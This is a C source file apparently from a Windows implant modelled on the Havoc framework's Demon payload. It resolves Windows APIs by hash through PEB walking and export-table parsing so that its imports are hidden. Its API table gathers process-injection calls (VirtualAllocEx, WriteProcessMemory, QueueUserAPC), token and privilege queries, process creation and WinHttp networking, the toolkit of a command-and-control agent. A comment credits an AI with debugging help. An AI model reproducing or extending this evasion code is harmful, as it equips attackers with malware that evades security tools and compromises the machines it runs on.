#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#include <Defines.h>
#include <typedef.h>
#include <Apihashing.h>

API_TABLE Api;

/*
Original implementation by @5pider
Credits to WKL ODPC
https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Win32.c
claude helped with debugging
*/
UINT_PTR HashString(LPVOID String, BOOLEAN IsWide)
{
    ULONG       Hash = APIhashval;
    PUCHAR      Ptr = String;

    do
    {
        UCHAR character = *Ptr;

        if (!*Ptr && !IsWide)
            break;

        if (character >= 'a')
            character -= 0x20;

        Hash = ((Hash << 5) + Hash) + character;

        if (IsWide && (!*Ptr && !*++Ptr))
            break;

        ++Ptr;

    } while (TRUE);

    return Hash;
}

VOID ACharStringToWCharString(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed)
{
    INT Length = MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return;
    }
}

SIZE_T StringLength(PBYTE String, BOOLEAN IsWide)
{
    PBYTE String2 = String;

    if (!IsWide) {
        for (String2 = String; *String2; ++String2);
    }
    else {
        for (String2 = String; *(LPWSTR)String2; ++String2);
    }
    return String2 - String;
}

PVOID LoadModulePeb(UINT_PTR hModuleHash)
{
    PLDR_DATA_TABLE_ENTRY Module = (PBYTE)((PPEB)PPEB_PTR)->Ldr->Reserved2[1];
    PLDR_DATA_TABLE_ENTRY FirstModule = Module;

    do
    {
        // Skip entries with no name
        if (Module->Reserved5[0] == NULL)
        {
            Module = Module->Reserved1[0];
            continue;
        }

        DWORD ModuleHash = HashString(Module->Reserved5[0], TRUE);

        if (ModuleHash == hModuleHash)
            return Module->DllBase;

        Module = Module->Reserved1[0];
    } while (Module && Module != FirstModule);

    return NULL;
}

PVOID LoadFunction(UINT_PTR Module, UINT_PTR FunctionHash)
{
    if (!Module)
        return NULL;

    PIMAGE_NT_HEADERS       NtHeader = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory = NULL;
    PDWORD                  AddrOfFunctions = NULL;
    PDWORD                  AddrOfNames = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FunctionAddr = NULL;
    PCHAR                   FunctionName = NULL;
    ANSI_STRING             AnsiString = { 0 };

    NtHeader = Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew;
    ExpDirectory = Module + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    AddrOfNames = Module + ExpDirectory->AddressOfNames;
    AddrOfFunctions = Module + ExpDirectory->AddressOfFunctions;
    AddrOfOrdinals = Module + ExpDirectory->AddressOfNameOrdinals;

    for (DWORD i = 0; i < ExpDirectory->NumberOfNames; i++)
    {
        FunctionName = (PCHAR)Module + AddrOfNames[i];
        if (HashString(FunctionName, 0) == FunctionHash)
        {
            FunctionAddr = Module + AddrOfFunctions[AddrOfOrdinals[i]];

            if (FunctionAddr > Module + NtHeader->OptionalHeader.DataDirectory[0].VirtualAddress &&
                FunctionAddr < Module + NtHeader->OptionalHeader.DataDirectory[0].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[0].Size
                )
            {
                CHAR ModuleName[MAX_PATH] = { 0 };
                DWORD Offset = 0;
                LPCSTR ExportModule = NULL;
                SIZE_T ModuleAndExportLen = 0;
                PVOID ModuleAddr = NULL;
                LPCSTR ExportName = NULL;

                ExportModule = FunctionAddr;
                ModuleAndExportLen = StringLength(FunctionAddr, FALSE);

                for (; Offset < ModuleAndExportLen; Offset++)
                {
                    if (*((PBYTE)ExportModule + Offset) == 0x2E)
                        break;
                }

                // Build ANSI module name with .dll extension for PEB match
                CHAR AnsiDllName[MAX_PATH] = { 0 };
                memcpy(AnsiDllName, ExportModule, Offset);
                strcat(AnsiDllName, ".dll");

                // Convert to wide for PEB hash matching
                RtlSecureZeroMemory(ModuleName, sizeof(ModuleName));
                ACharStringToWCharString(ModuleName, AnsiDllName, Offset + 4);

                // Try PEB first
                ModuleAddr = LoadModulePeb(HashString(ModuleName, TRUE));

                // Fallback to LoadLibraryA
                if (!ModuleAddr)
                {
                    ModuleAddr = LoadLibraryA(AnsiDllName);
                }

                if (!ModuleAddr)
                    return NULL;

                ExportName = ExportModule + Offset + 1;

                return LoadFunction(ModuleAddr, HashString(ExportName, FALSE));
            }
            return FunctionAddr;
        }
    }

    return NULL;
}

void initializeAPI()
{
    // Load DLLs not guaranteed to be in PEB
    LoadLibraryA("ADVAPI32.DLL");
    LoadLibraryA("iphlpapi.dll");
    LoadLibraryA("winhttp.dll");

    // Resolve modules from PEB
    PVOID kernel32dll = LoadModulePeb(H_MODULE_KERNEL32);
    PVOID ntdll       = LoadModulePeb(H_MODULE_NTDLL);
    PVOID advapi32dll = LoadModulePeb(H_MODULE_ADVAPI32);
    PVOID iphlpapidll = LoadModulePeb(H_MODULE_IPHLPAPI);
    PVOID winhtttpdll = LoadModulePeb(H_MODULE_WINHTTP);

    // ADVAPI32
    Api.GetTokenInformation         = (fnGetTokenInformation)LoadFunction(advapi32dll, H_FUNC_GETTOKENINFORMATION);
    Api.GetUserNameA                = (fnGetUserNameA)LoadFunction(advapi32dll, H_FUNC_GETUSERNAMEA);
    Api.LookupPrivilegeDisplayNameA = (fnLookupPrivilegeDisplayNameA)LoadFunction(advapi32dll, H_FUNC_LOOKUPPRIVILEGEDISPLAYNAMEA);
    Api.LookupPrivilegeNameA        = (fnLookupPrivilegeNameA)LoadFunction(advapi32dll, H_FUNC_LOOKUPPRIVILEGENAMEA);
    Api.OpenProcessToken            = (fnOpenProcessToken)LoadFunction(advapi32dll, H_FUNC_OPENPROCESSTOKEN);

    // IPHLPAPI
    Api.GetAdaptersInfo             = (fnGetAdaptersInfo)LoadFunction(iphlpapidll, H_FUNC_GETADAPTERSINFO);

    // KERNEL32
    Api.CloseHandle                 = (fnCloseHandle)LoadFunction(kernel32dll, H_FUNC_CLOSEHANDLE);
    Api.CreateFileA                 = (fnCreateFileA)LoadFunction(kernel32dll, H_FUNC_CREATEFILEA);
    Api.CreatePipe                  = (fnCreatePipe)LoadFunction(kernel32dll, H_FUNC_CREATEPIPE);
    Api.CreateProcessA              = (fnCreateProcessA)LoadFunction(kernel32dll, H_FUNC_CREATEPROCESSA);
    Api.DeleteCriticalSection       = (fnDeleteCriticalSection)LoadFunction(kernel32dll, H_FUNC_DELETECRITICALSECTION);
    Api.EnterCriticalSection        = (fnEnterCriticalSection)LoadFunction(kernel32dll, H_FUNC_ENTERCRITICALSECTION);
    Api.ExitProcess                 = (fnExitProcess)LoadFunction(kernel32dll, H_FUNC_EXITPROCESS);
    Api.FileTimeToLocalFileTime     = (fnFileTimeToLocalFileTime)LoadFunction(kernel32dll, H_FUNC_FILETIMETOLOCALFILETIME);
    Api.FileTimeToSystemTime        = (fnFileTimeToSystemTime)LoadFunction(kernel32dll, H_FUNC_FILETIMETOSYSTEMTIME);
    Api.FindClose                   = (fnFindClose)LoadFunction(kernel32dll, H_FUNC_FINDCLOSE);
    Api.FindFirstFileA              = (fnFindFirstFileA)LoadFunction(kernel32dll, H_FUNC_FINDFIRSTFILEA);
    Api.FindNextFileA               = (fnFindNextFileA)LoadFunction(kernel32dll, H_FUNC_FINDNEXTFILEA);
    Api.GetComputerNameExA          = (fnGetComputerNameExA)LoadFunction(kernel32dll, H_FUNC_GETCOMPUTERNAMEXA);
    Api.GetCurrentDirectoryA        = (fnGetCurrentDirectoryA)LoadFunction(kernel32dll, H_FUNC_GETCURRENTDIRECTORYA);
    Api.GetCurrentProcess           = (fnGetCurrentProcess)LoadFunction(kernel32dll, H_FUNC_GETCURRENTPROCESS);
    Api.GetCurrentProcessId         = (fnGetCurrentProcessId)LoadFunction(kernel32dll, H_FUNC_GETCURRENTPROCESSID);
    Api.GetFileSize                 = (fnGetFileSize)LoadFunction(kernel32dll, H_FUNC_GETFILESIZE);
    Api.GetFullPathNameA            = (fnGetFullPathNameA)LoadFunction(kernel32dll, H_FUNC_GETFULLPATHNAMEA);
    Api.GetLastError                = (fnGetLastError)LoadFunction(kernel32dll, H_FUNC_GETLASTERROR);
    Api.GetModuleFileNameA          = (fnGetModuleFileNameA)LoadFunction(kernel32dll, H_FUNC_GETMODULEFILENAMEA);
    Api.GetModuleHandleA            = (fnGetModuleHandleA)LoadFunction(kernel32dll, H_FUNC_GETMODULEHANDLEA);
    Api.GetProcAddress              = (fnGetProcAddress)LoadFunction(kernel32dll, H_FUNC_GETPROCADDRESS);
    Api.GetStartupInfoA             = (fnGetStartupInfoA)LoadFunction(kernel32dll, H_FUNC_GETSTARTUPINFOA);
    Api.GetTickCount                = (fnGetTickCount)LoadFunction(kernel32dll, H_FUNC_GETTICKCOUNT);
    Api.InitializeCriticalSection   = (fnInitializeCriticalSection)LoadFunction(kernel32dll, H_FUNC_INITIALIZECRITICALSECTION);
    Api.IsDBCSLeadByteEx            = (fnIsDBCSLeadByteEx)LoadFunction(kernel32dll, H_FUNC_ISDBCSLEADBYTEEX);
    Api.LeaveCriticalSection        = (fnLeaveCriticalSection)LoadFunction(kernel32dll, H_FUNC_LEAVECRITICALSECTION);
    Api.LocalAlloc                  = (fnLocalAlloc)LoadFunction(kernel32dll, H_FUNC_LOCALALLOC);
    Api.LocalFree                   = (fnLocalFree)LoadFunction(kernel32dll, H_FUNC_LOCALFREE);
    Api.LocalReAlloc                = (fnLocalReAlloc)LoadFunction(kernel32dll, H_FUNC_LOCALREALLOC);
    Api.MultiByteToWideChar         = (fnMultiByteToWideChar)LoadFunction(kernel32dll, H_FUNC_MULTIBYTETOWIDECHAR);
    Api.PeekNamedPipe               = (fnPeekNamedPipe)LoadFunction(kernel32dll, H_FUNC_PEEKNAMEDPIPE);
    Api.QueueUserAPC                = (fnQueueUserAPC)LoadFunction(kernel32dll, H_FUNC_QUEUEUSERAPC);
    Api.ReadFile                    = (fnReadFile)LoadFunction(kernel32dll, H_FUNC_READFILE);
    Api.ResumeThread                = (fnResumeThread)LoadFunction(kernel32dll, H_FUNC_RESUMETHREAD);
    Api.SetCurrentDirectoryA        = (fnSetCurrentDirectoryA)LoadFunction(kernel32dll, H_FUNC_SETCURRENTDIRECTORYA);
    Api.SetHandleInformation        = (fnSetHandleInformation)LoadFunction(kernel32dll, H_FUNC_SETHANDLEINFORMATION);
    Api.SetUnhandledExceptionFilter = (fnSetUnhandledExceptionFilter)LoadFunction(kernel32dll, H_FUNC_SETUNHANDLEDEXCEPTIONFILTER);
    Api.Sleep                       = (fnSleep)LoadFunction(kernel32dll, H_FUNC_SLEEP);
    Api.TerminateProcess            = (fnTerminateProcess)LoadFunction(kernel32dll, H_FUNC_TERMINATEPROCESS);
    Api.TlsGetValue                 = (fnTlsGetValue)LoadFunction(kernel32dll, H_FUNC_TLSGETVALUE);
    Api.VirtualAllocEx              = (fnVirtualAllocEx)LoadFunction(kernel32dll, H_FUNC_VIRTUALALLOCEX);
    Api.VirtualProtect              = (fnVirtualProtect)LoadFunction(kernel32dll, H_FUNC_VIRTUALPROTECT);
    Api.VirtualProtectEx            = (fnVirtualProtectEx)LoadFunction(kernel32dll, H_FUNC_VIRTUALPROTECTEX);
    Api.VirtualQuery                = (fnVirtualQuery)LoadFunction(kernel32dll, H_FUNC_VIRTUALQUERY);
    Api.WaitForSingleObject         = (fnWaitForSingleObject)LoadFunction(kernel32dll, H_FUNC_WAITFORSINGLEOBJECT);
    Api.WideCharToMultiByte         = (fnWideCharToMultiByte)LoadFunction(kernel32dll, H_FUNC_WIDECHARTOMULTIBYTE);
    Api.WriteFile                   = (fnWriteFile)LoadFunction(kernel32dll, H_FUNC_WRITEFILE);
    Api.WriteProcessMemory          = (fnWriteProcessMemory)LoadFunction(kernel32dll, H_FUNC_WRITEPROCESSMEMORY);

    // WINHTTP
    Api.WinHttpAddRequestHeaders    = (fnWinHttpAddRequestHeaders)LoadFunction(winhtttpdll, H_FUNC_WINHTTPADDREQUESTHEADERS);
    Api.WinHttpCloseHandle          = (fnWinHttpCloseHandle)LoadFunction(winhtttpdll, H_FUNC_WINHTTPCLOSEHANDLE);
    Api.WinHttpConnect              = (fnWinHttpConnect)LoadFunction(winhtttpdll, H_FUNC_WINHTTPCONNECT);
    Api.WinHttpOpen                 = (fnWinHttpOpen)LoadFunction(winhtttpdll, H_FUNC_WINHTTPOPEN);
    Api.WinHttpOpenRequest          = (fnWinHttpOpenRequest)LoadFunction(winhtttpdll, H_FUNC_WINHTTPOPENREQUEST);
    Api.WinHttpReadData             = (fnWinHttpReadData)LoadFunction(winhtttpdll, H_FUNC_WINHTTPREADDATA);
    Api.WinHttpReceiveResponse      = (fnWinHttpReceiveResponse)LoadFunction(winhtttpdll, H_FUNC_WINHTTPRECEIVERESPONSE);
    Api.WinHttpSendRequest          = (fnWinHttpSendRequest)LoadFunction(winhtttpdll, H_FUNC_WINHTTPSENDREQUEST);
    Api.WinHttpSetOption            = (fnWinHttpSetOption)LoadFunction(winhtttpdll, H_FUNC_WINHTTPSETOPTION);
}